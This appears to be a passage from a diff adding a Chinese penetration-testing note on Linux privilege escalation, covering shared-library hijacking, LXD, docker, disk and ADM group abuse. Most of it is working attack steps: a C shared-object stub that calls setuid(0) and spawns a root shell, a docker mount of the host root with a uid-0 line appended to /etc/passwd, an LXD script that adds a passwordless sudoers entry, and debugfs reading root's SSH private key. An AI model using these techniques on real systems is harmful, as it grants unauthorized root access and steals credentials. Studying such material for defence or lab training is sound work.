+/lib和/usr/lib目录
+/etc/ld.so.conf中的目录
+</code></pre>
+<p>1.通过ldd来获取程序使用的共享库信息</p>
+<pre><code>ldd 程序路径
+</code></pre>
+<p>2.找到程序利用的非标准依赖库</p>
+<p>3.利用<code>readelf -d 程序 | grep PATH</code>查看程序自定义的共享库位置/或者是<code>objdump -x 程序 | grep RPATH</code></p>
+<p>4.找到自定义的共享库位置，自建链接库的文件到该共享库文件夹，执行程序查看是否缺少函数</p>
+<p>5.创建.c文件，自定义这个函数名，设置uid为root，利用其执行bash或sh</p>
+<pre><code class='language-c' lang='c'>#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+void 函数名() {
+    setuid(0);
+    system(&quot;/bin/sh -p&quot;);
+}
+</code></pre>
+<p>6.编译文件为动态链接文件<code>gcc c文件 -fPIC -shared -o /共享库/共享对象文件</code></p>
+<p>等待用户执行该漏洞二进制程序</p>
+<p>(文件可由msf中的模块编译而成），</p>
+<p>利用该漏洞进行提权需要注意的是：</p>
+<p>1.我们需要找到一个具有缺陷的二进制文件或程序，并且有用户执行(或者是进行社工)</p>
+<p>2.该程序存在外部的共享库依赖，并非只有标准库</p>
+<p>3.我们对共享库的目录具有可写的权限,即我们可以替代该共享库(||该文件有缺陷，缺少函数名称，我们可以手动创建链接到共享库以便于执行我们自定义的函数)</p>
+<p>这里能够找到相同的案例：<a href='https://tbhaxor.com/exploiting-shared-library-misconfigurations/' target='_blank' class='url'>https://tbhaxor.com/exploiting-shared-library-misconfigurations/</a></p>
+<h4 id='利用特权组提权'>利用特权组提权</h4>
+<h5 id='lxclxd提权'>LXC/LXD提权</h5>
+<p><strong>lab setup</strong></p>
+<p>创建一个名为lowpriv的用户，并将其添加到lxd组中</p>
+<pre><code>useradd -m lowpriv --shell /bin/bash
+usermod -a -G lxd lowpriv
+</code></pre>
+<p>切换到该用户，并验证该用户是否在组中</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\lxd-setup.png" referrerpolicy="no-referrer" alt="lxd-setup"></p>
+<p>然后配置新容器的服务区默认值</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\lxd-init.png" referrerpolicy="no-referrer" alt="lxd-init"></p>
+<p>我们需要一个新的容器来进行实验，检查是否有容器</p>
+<pre><code>lxc ls
+</code></pre>
+<p>如果没有，我们可以进行一个容器搭载</p>
+<pre><code>lxc launch ubuntu:18.04 falcor
+</code></pre>
+<p>容器下载需要一定的时间</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\lxc-ls.jpg" referrerpolicy="no-referrer" alt="lxc-ls"></p>
+<p>看起来没有什么问题，继续，我们从外部获取一个python脚本，并且运行</p>
+<pre><code>python lxd_rootv2.py uu2(容器名称)
+</code></pre>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\lxd_rootv2.png" referrerpolicy="no-referrer" alt="lxd_rootv2"></p>
+<p>可以看到能够执行sudo命令，并且不需要密码，或许我们想知道这个脚本干了些什么</p>
+<pre><code>1.将 systemd 服务单元文件写入 /tmp/evil.service
+2.使用 LXD 附加到私有 systemd 套接字文件，将其在容器内映射到 /tmp/container_sock
+3.使用 LXD 将同一套接字再次代理回 /tmp/host_sock 的主机
+4.通过此隧道与 systemd 专用套接字通信，劫持套接字辅助数据中传递的根凭据。运行以下命令：
+	Systemctl link /tmp/evil.service
+	systemctl daemon-reload Systemctl daemon-reload
+	systemctl start evil.service
+	systemctl disable evil.service
+</code></pre>
+<p><code>evil.service</code> 在 root 的上下文中启动。它所做的只是在 /etc/sudoers 中添加一行，允许调用用户使用 sudo，无需密码，有关漏洞原理可以阅读<a href='https://shenaniganslabs.io/2019/05/21/LXD-LPE.html' target='_blank' class='url'>https://shenaniganslabs.io/2019/05/21/LXD-LPE.html</a></p>
+<h5 id='docker提权'>docker提权</h5>
+<p>创建一个用户，并将其添加到docker组中</p>
+<pre><code>useradd -m doc --shell docker
+usermodd -G docker doc
+</code></pre>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\docker-add.png" referrerpolicy="no-referrer" alt="docker-add"></p>
+<p>由于docker命令运行前都会默认添加sudo，所以docker组中的用户其实已经相当于root，我们可以使用docker命令直接获取权限</p>
+<pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+</code></pre>
+<p>该命令通过将外部容器/挂载到内部容器/hostOS，从而获取root权限</p>
+<pre><code>docker run -v /root:/mnt -it ubuntu
+</code></pre>
+<p>该命令将/root目录作为系统卷启动，启动后可查看/etc/passwd等密钥，通过破解来获取root权限，也可以添加特权账号</p>
+<pre><code>openssl passwd -1 -salt name
+</code></pre>
+<p>来生成saltpasswd，按照格式插入到/etc/passwd即可切换用户</p>
+<pre><code>echo &#39;name:saltpasswd:0:0::/root:/bin/bash&#39; &gt;&gt;passwd
+</code></pre>
+<h5 id='disk提权'>Disk提权</h5>
+<p>将测试用户添加到disk组中，diks组中的用户可以完全访问/dev/中包含的任何设备和文件，我们可以利用debugfs中的root权限进行提权</p>
+<pre><code>ls -la /dev/sda1
+debugfs /dev/sda1
+cd /root 
+cd .ssh
+cat id_rsa
+</code></pre>
+<p>拿到root用户的密钥</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\技术原理与分析\提权\disk-key.png" referrerpolicy="no-referrer" alt="disk-key"></p>
+<p>之后遍可使用ssh远程登录</p>
+<h5 id='adm提权'>ADM提权</h5>
+<p>ADM组中的用户有权限读取/var/log,用于收集存储在日志文件中的敏感信息和定时任务，枚举用户操作等</p>
+</body>
+</html>
